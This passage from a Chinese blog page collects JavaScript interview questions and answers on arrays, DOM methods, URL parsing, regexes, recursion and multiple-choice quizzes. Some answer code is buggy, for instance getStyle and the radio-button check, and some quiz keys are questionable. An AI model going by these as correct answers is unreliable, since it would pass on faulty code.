class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; aArray.length; j++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (nowNub == aArray[j]) &#123;</span><br><span class="line">      randomNub(aArray, len, min, max);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  aArray.push(nowNub);</span><br><span class="line">  randomNub(aArray, len, min, max);</span><br><span class="line">  <span class="keyword">return</span> aArray;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> arr=[];</span><br><span class="line">randomNub(arr,<span class="number">10</span>,<span class="number">10</span>,<span class="number">100</span>);</span><br></pre></td></tr></table></figure><h3 id="生成5个不同的随机数；"><a href="#生成5个不同的随机数；" class="headerlink" title="生成5个不同的随机数；"></a>生成5个不同的随机数；</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//思路：5个不同的数，每生成一次就和前面的所有数字相比较，如果有相同的，则放弃当前生成的数字！</span><br><span class="line">var num1 = [];</span><br><span class="line">for(var i = 0; i &lt; 5; i++)&#123;</span><br><span class="line">    num1[i] = Math.floor(Math.random()*10) + 1; //范围是 [1, 10]</span><br><span class="line">    for(var j = 0; j &lt; i; j++)&#123;</span><br><span class="line">        if(num1[i] == num1[j])&#123;</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="合并数据并删除某个指定下标元素"><a href="#合并数据并删除某个指定下标元素" class="headerlink" title="合并数据并删除某个指定下标元素"></a>合并数据并删除某个指定下标元素</h3><p>把两个数组合并，并删除第二个元素。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var array1 = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;];</span><br><span class="line">var bArray = [&apos;d&apos;,&apos;e&apos;,&apos;f&apos;];</span><br><span class="line">var cArray = array1.concat(bArray);</span><br><span class="line">cArray.splice(1,1);</span><br></pre></td></tr></table></figure><h3 id="DOM-节点操作"><a href="#DOM-节点操作" class="headerlink" title="DOM 节点操作"></a>DOM 节点操作</h3><p>添加、移除、移动、复制、创建和查找节点（原生JS）</p><p>1）创建新节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.createDocumentFragment()    //创建一个DOM片段</span><br><span class="line">document.createElement()   //创建一个具体的元素</span><br><span class="line">document.createTextNode()   //创建一个文本节点</span><br></pre></td></tr></table></figure><p>2）添加、移除、替换、插入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">domObj.appendChild();    //添加</span><br><span class="line">domObj.removeChild();      //移除</span><br><span class="line">domObj.replaceChild();      //替换</span><br><span class="line">domObj.insertBefore();      //插入</span><br></pre></td></tr></table></figure><p>3）查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.getElementsByTagName()    //通过标签名称</span><br><span class="line">document.getElementsByName()     //通过元素的Name属性的值</span><br><span class="line">document.getElementById()        //通过元素Id，唯一性</span><br></pre></td></tr></table></figure><h3 id="URL-解析成-json-对象"><a href="#URL-解析成-json-对象" class="headerlink" title="URL 解析成 json 对象"></a>URL 解析成 json 对象</h3><p>有这样一个 URL：<code>http://item.taobao.com/item.htm?a=1&amp;b=2&amp;c=&amp;d=xxx&amp;e</code>，请写一段 JS 程序提取 URL 中的各个 GET 参数(参数名和参数个数不确定)，将其按 key-value 形式返回到一个 json 结构中，如 <code>{a:’1′, b:’2′, c:”, d:’xxx’, e:undefined}</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function serilizeUrl(url) &#123;</span><br><span class="line">  var urlObject = &#123;&#125;;</span><br><span class="line">  if (/\?/.test(url)) &#123;</span><br><span class="line">    var urlString = url.substring(url.indexOf(&quot;?&quot;) + 1);</span><br><span class="line">    var urlArray = urlString.split(&quot;&amp;&quot;);</span><br><span class="line">    for (var i = 0, len = urlArray.length; i &lt; len; i++) &#123;</span><br><span class="line">      var urlItem = urlArray[i];</span><br><span class="line">      var item = urlItem.split(&quot;=&quot;);</span><br><span class="line">      urlObject[item[0]] = item[1];</span><br><span class="line">    &#125;</span><br><span class="line">    return urlObject;</span><br><span class="line">  &#125;</span><br><span class="line">  return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="正则表达式和正则字面量区别"><a href="#正则表达式和正则字面量区别" class="headerlink" title="正则表达式和正则字面量区别"></a>正则表达式和正则字面量区别</h3><p>正则表达式构造函数<code>var reg=new RegExp(&quot;xxx&quot;)</code>与正则表达字面量<code>var reg=//</code>有什么不同，匹配邮箱的正则表达式。</p><blockquote><p>当使用 RegExp() 构造函数的时候，不仅需要转义引号（即 \” 表示 “），还需要双反斜杠（即\表示一个\）。使用正则表达字面量的效率更高。</p></blockquote><p>邮箱的正则匹配：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var regMail = /^([a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+((.[a-zA-Z0-9_-]&#123;2,3&#125;)&#123;1,2&#125;)$/;</span><br></pre></td></tr></table></figure><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>写出简单描述 html 标签（不带属性的开始标签和结束标签）的正则表达式，并将<code>var str = &quot;&lt;div&gt;这里是div&lt;p&gt;里面的段落&lt;/p&gt;&lt;/div&gt;&quot;</code>;字符串中的 html 标签去除掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var reg = /&lt;\/?\w+\/?&gt;/gi;</span><br><span class="line">var str = &quot;&lt;div&gt;这里是div&lt;p&gt;里面的段落&lt;/p&gt;&lt;/div&gt;&quot;;</span><br><span class="line">alert(str.replace(reg,&quot; &quot;));</span><br></pre></td></tr></table></figure><h3 id="清除字符串前后的空格"><a href="#清除字符串前后的空格" class="headerlink" title="清除字符串前后的空格"></a>清除字符串前后的空格</h3><p>写一个function，清除字符串前后的空格。（兼容所有浏览器）使用自带接口 trim()，考虑兼容性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (!String.prototype.trim) &#123; </span><br><span class="line">  String.prototype.trim = function() &#123; </span><br><span class="line">    return this.replace(/^\s+/, &quot;&quot;).replace(/\s+$/,&quot;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">// test the function </span><br><span class="line">var str = &quot; \t\n test string &quot;.trim(); </span><br><span class="line">alert(str == &quot;test string&quot;); // alerts &quot;true&quot;</span><br></pre></td></tr></table></figure><h3 id="Javascript中-callee-和-caller-的作用"><a href="#Javascript中-callee-和-caller-的作用" class="headerlink" title="Javascript中 callee 和 caller 的作用"></a>Javascript中 callee 和 caller 的作用</h3><blockquote><p>caller是返回一个对函数的引用，该函数调用了当前函数；<br>callee是返回正在被执行的 function 函数，也就是所指定的 function 对象的正文。</p></blockquote><p>如果一对兔子每月生一对兔子；一对新生兔，从第二个月起就开始生兔子；假定每对兔子都是一雌一雄，试问一对兔子，第n个月能繁殖成多少对兔子？（使用callee完成）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> result = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">n</span>) </span>&#123;  <span class="comment">//典型的斐波那契数列</span></span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (result[n]) &#123;</span><br><span class="line">      <span class="keyword">return</span> result[n];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//argument.callee()表示fn()</span></span><br><span class="line">      result[n] = <span class="built_in">arguments</span>.callee(n - <span class="number">1</span>) + <span class="built_in">arguments</span>.callee(n - <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">return</span> result[n];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数组去重"><a href="#数组去重" class="headerlink" title="数组去重"></a>数组去重</h3><p>方法一: 每遍历一次就和之前的所有做比较，不相等则放入新的数组中！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里用的原型 个人做法；</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.unique = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> len = <span class="keyword">this</span>.length,</span><br><span class="line">    newArr = [],</span><br><span class="line">    flag = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++, flag = <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>[i] == <span class="keyword">this</span>[j])&#123;</span><br><span class="line">        flag = <span class="number">0</span>;        <span class="comment">//找到相同的数字后，不执行添加数据</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    flag ? newArr.push(<span class="keyword">this</span>[i]) : <span class="string">''</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> newArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法二：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">25</span>,<span class="number">4</span>];</span><br><span class="line"><span class="built_in">Array</span>.prototype.unique2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> n = []; <span class="comment">//一个新的临时数组</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.length; i++) <span class="comment">//遍历当前数组</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//如果当前数组的第i已经保存进了临时数组，那么跳过，</span></span><br><span class="line">    <span class="comment">//否则把当前项push到临时数组里面</span></span><br><span class="line">    <span class="keyword">if</span> (n.indexOf(<span class="keyword">this</span>[i]) == <span class="number">-1</span>) n.push(<span class="keyword">this</span>[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> newArr2=arr.unique2(arr);</span><br><span class="line">alert(newArr2); <span class="comment">//输出1,2,3,4,5,6,9,25</span></span><br></pre></td></tr></table></figure><h3 id="阶乘函数；"><a href="#阶乘函数；" class="headerlink" title="阶乘函数；"></a>阶乘函数；</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//原型方法</span><br><span class="line">Number.prototype.N = function()&#123;</span><br><span class="line">    var re = 1;</span><br><span class="line">    for(var i = 1; i &lt;= this; i++)&#123;</span><br><span class="line">        re *= i;</span><br><span class="line">    &#125;</span><br><span class="line">    return re;</span><br><span class="line">&#125;</span><br><span class="line">var num = 5;</span><br><span class="line">alert(num.N());</span><br></pre></td></tr></table></figure><h3 id="判断一个字符串中出现次数最多的字符，统计这个次数"><a href="#判断一个字符串中出现次数最多的字符，统计这个次数" class="headerlink" title="判断一个字符串中出现次数最多的字符，统计这个次数"></a>判断一个字符串中出现次数最多的字符，统计这个次数</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'asdfssaaasasasasaa'</span>;</span><br><span class="line"><span class="keyword">var</span> json = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i++) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!json[str.charAt(i)])&#123;</span><br><span class="line">    json[str.charAt(i)] = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    json[str.charAt(i)]++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> iMax = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> iIndex = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> json) &#123;</span><br><span class="line">  <span class="keyword">if</span>(json[i]&gt;iMax)&#123;</span><br><span class="line">    iMax = json[i];</span><br><span class="line">    iIndex = i;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">alert(<span class="string">'出现次数最多的是:'</span> + iIndex + <span class="string">'出现'</span> + iMax + <span class="string">'次'</span>);</span><br></pre></td></tr></table></figure><h3 id="写一个获取非行间样式的函数"><a href="#写一个获取非行间样式的函数" class="headerlink" title="写一个获取非行间样式的函数"></a>写一个获取非行间样式的函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function getStyle (obj, attr, value) &#123;</span><br><span class="line">  if(!value) &#123;</span><br><span class="line">    if(obj.currentStyle) &#123;</span><br><span class="line">      return obj.currentStyle(attr);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      obj.getComputedStyle(attr,false);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    obj.style[attr] = value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="confirm-确认用户是否退出当前页面，确认之后关闭窗"><a href="#confirm-确认用户是否退出当前页面，确认之后关闭窗" class="headerlink" title="confirm 确认用户是否退出当前页面，确认之后关闭窗"></a>confirm 确认用户是否退出当前页面，确认之后关闭窗</h3><p>补充按钮事件的函数，确认用户是否退出当前页面，确认之后关闭窗?</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script type=”text/javascript” &gt;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">closeWin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//在此处添加代码</span></span><br><span class="line">    <span class="keyword">if</span>(confirm(<span class="string">"确定要退出吗？"</span>))&#123;</span><br><span class="line">      <span class="built_in">window</span>.close(); </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;input type=”button”value=”关闭窗口”onclick=”closeWin()”/&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><h3 id="选中单选框"><a href="#选中单选框" class="headerlink" title="选中单选框"></a>选中单选框</h3><p>完成foo()函数的内容，要求能够弹出对话框提示当前选中的是第几个单选框。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;metahttp-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html;charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">&lt;script type="text/</span>javascript<span class="string">" &gt;</span></span><br><span class="line"><span class="string">  function foo() &#123;</span></span><br><span class="line"><span class="string">    //在此处添加代码</span></span><br><span class="line"><span class="string">    var rdo = document.form1.radioGroup;</span></span><br><span class="line"><span class="string">    for(var i = 0; i &lt; rdo.length; i++) &#123;</span></span><br><span class="line"><span class="string">      if(rdo.checked) &#123;</span></span><br><span class="line"><span class="string">        alert(“您选择的是第”+(i+1)+”个单选框”);</span></span><br><span class="line"><span class="string">      &#125; </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;form name="</span>form1<span class="string">" &gt;</span></span><br><span class="line"><span class="string">    &lt;input type="</span>radio<span class="string">" name="</span>radioGroup<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">    &lt;input type="</span>radio<span class="string">" name="</span>radioGroup<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">    &lt;input type="</span>radio<span class="string">" name="</span>radioGroup<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">    &lt;input type="</span>radio<span class="string">" name="</span>radioGroup<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">    &lt;input type="</span>submit<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">  &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><h3 id="根据下拉列表显示图片"><a href="#根据下拉列表显示图片" class="headerlink" title="根据下拉列表显示图片"></a>根据下拉列表显示图片</h3><p>完成函数showImg()，要求能够动态根据下拉列表的选项变化，更新图片的显示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;script type=<span class="string">"text/javascript"</span> &gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showImg</span> (<span class="params">oSel</span>) </span>&#123;</span><br><span class="line">      <span class="comment">//在此处添加代码 </span></span><br><span class="line">      <span class="keyword">var</span> str = oSel.value;</span><br><span class="line">      <span class="built_in">document</span>.getElementById(<span class="string">"pic"</span>).src= str + <span class="string">".jpg"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">  &lt;img id="pic" src="img1.jpg" width="200" height="200" /</span>&gt;</span><br><span class="line">  &lt;br /&gt;</span><br><span class="line">  &lt;select id=<span class="string">"sel"</span>&gt;</span><br><span class="line">    &lt;option value=<span class="string">"img1"</span>&gt;城市生活&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">    &lt;option value="img2"&gt;都市早报&lt;/</span>option&gt;</span><br><span class="line">    &lt;option value=<span class="string">"img3"</span>&gt;青山绿水&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>select&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br></pre></td></tr></table></figure><h3 id="截取字符串"><a href="#截取字符串" class="headerlink" title="截取字符串"></a>截取字符串</h3><p>截取字符串 abcdefg 的 efg</p><p><code>alert(&#39;abcdefg&#39;.substring(4));</code></p><h2 id="25、程序选择题"><a href="#25、程序选择题" class="headerlink" title="25、程序选择题"></a>25、程序选择题</h2><p>Javascript中, 以下哪条语句一定会产生运行错误？ ( BC )</p><ul><li>A、var _变量=NaN;</li><li>B、var 0bj = [];</li><li>C、var obj = //;</li><li>D、var obj = {};</li></ul><p>以下两个变量 a 和 b，a + b 的哪个结果是 NaN？ ( AC )</p><ul><li>A、var a=undefined; b=NaN</li><li>B、var a= ‘123’; b=NaN</li><li>C、var a =undefined , b =NaN</li><li>D、var a=NaN , b=’undefined’</li></ul><p>var a=10; b=20; c=4; ++b+c+a++ 以下哪个结果是正确的？( B )</p><ul><li>A、34</li><li>B、35</li><li>C、36</li><li>D、37</li></ul><p>要将页面的状态栏中显示“已经选中该文本框”，下列JavaScript语句正确的是 ( A )</p><ul><li>A. window.status=”已经选中该文本框”</li><li>B. document.status=”已经选中该文本框”</li><li>C. window.screen=”已经选中该文本框”</li><li>D. document.screen=”已经选中该文本框”</li></ul><p>以下哪条语句会产生运行错误：( AD )</p><ul><li>A.var obj = ();</li><li>B.var obj = [];</li><li>C.var obj = {};</li><li>D.var obj = //;</li></ul><p>以下哪个单词不属于 javascript 保留字：( B )</p><ul><li>A.with</li><li>B.parent</li><li>C.class</li><li>D.void</li></ul><p>请选择结果为真的表达式：( C )</p><ul><li>A.null instanceof Object</li><li>B.null === undefined</li><li>C.null == undefined</li><li>D.NaN == NaN</li></ul><h2 id="26、填空题"><a href="#26、填空题" class="headerlink" title="26、填空题"></a>26、填空题</h2><p>Javascript中, 如果已知HTML页面中的某标签对象的id=”username”，用(…)方法获得该标签对象。</p><blockquote><p>document.getElementById(“username”);</p></blockquote><p>typeof运算符返回值中有一个跟javascript数据类型不一致，它是(…)。</p><blockquote><p>function</p></blockquote><p>定义了一个变量，但没有为该变量赋值，如果 alert 该变量，javascript 弹出的对话框中显示(…)。</p><blockquote><p>undefined</p></blockquote><h2 id="27、列举浏览器对象模型-BOM-里常用的至少-4-个对象，并列举-window-7象的常用方法至少-5-个"><a href="#27、列举浏览器对象模型-BOM-里常用的至少-4-个对象，并列举-window-7象的常用方法至少-5-个" class="headerlink" title="27、列举浏览器对象模型 BOM 里常用的至少 4 个对象，并列举 window 7象的常用方法至少 5 个"></a>27、列举浏览器对象模型 BOM 里常用的至少 4 个对象，并列举 window 7象的常用方法至少 5 个</h2><p>对象：</p><blockquote><p>window<br>document<br>location<br>screen<br>history<br>navigator</p></blockquote><p>方法：</p><blockquote><p>alert()<br>confirm()<br>prompt()<br>open()<br>close()</p></blockquote><h2 id="28、简述列举文档对象模型-DOM-里-document-的常用的查找访问节点的方法并做简单说明"><a href="#28、简述列举文档对象模型-DOM-里-document-的常用的查找访问节点的方法并做简单说明" class="headerlink" title="28、简述列举文档对象模型 DOM 里 document 的常用的查找访问节点的方法并做简单说明"></a>28、简述列举文档对象模型 DOM 里 document 的常用的查找访问节点的方法并做简单说明</h2><blockquote><p>Document.getElementById 根据元素id查找元素<br>Document.getElementByName 根据元素name查找元素<br>Document.getElementTagName 根据指定的元素名查找元素</p></blockquote><h2 id="29、简述创建函数的几种方式"><a href="#29、简述创建函数的几种方式" class="headerlink" title="29、简述创建函数的几种方式"></a>29、简述创建函数的几种方式</h2><p>第一种（函数声明）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function sum1(num1,num2)&#123;</span><br><span class="line">   return num1+num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二种（函数表达式）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var sum2 = function(num1,num2)&#123;</span><br><span class="line">   return num1+num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三种（函数对象方式）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var sum3 = new Function(&quot;num1&quot;, &quot;num2&quot;, &quot;return num1+num2&quot;);</span><br></pre></td></tr></table></figure><h2 id="30、Javascript创建对象的几种方式"><a href="#30、Javascript创建对象的几种方式" class="headerlink" title="30、Javascript创建对象的几种方式"></a>30、Javascript创建对象的几种方式</h2><p>1)、<code>var obj = {};</code>（使用json创建对象）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;&#125;;</span><br><span class="line">obj.name = &apos;张三&apos;;</span><br><span class="line">obj.action = function ()&#123;</span><br><span class="line">  alert(&apos;吃饭&apos;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>2)、<code>var obj = new Object();</code>（使用Object创建对象）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var obj = new Object();</span><br><span class="line">obj.name = &apos;张三&apos;;</span><br><span class="line">obj.action = function ()&#123;</span><br><span class="line">    alert(&apos;吃饭&apos;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>3)、通过函数创建对象。</p><p>(a)、使用 this 关键字，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var obj = function () &#123;</span><br><span class="line">  this.name =&apos;张三&apos;;</span><br><span 